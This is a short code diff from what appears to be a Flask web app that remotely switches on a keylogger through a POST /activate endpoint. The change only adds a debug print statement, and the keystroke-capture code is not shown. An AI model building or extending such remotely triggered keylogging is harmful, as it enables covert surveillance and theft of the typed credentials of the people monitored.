@@ -10,6 +10,7 @@ def serve_html():
 
 @app.route('/activate', methods=['POST'])
 def activate_keylogger():
+    print("Received activation request.")  # Debugging line
     activate_logging()  # Set the global flag in keylogger.py to start logging
     return "Keylogger activated!", 200
 
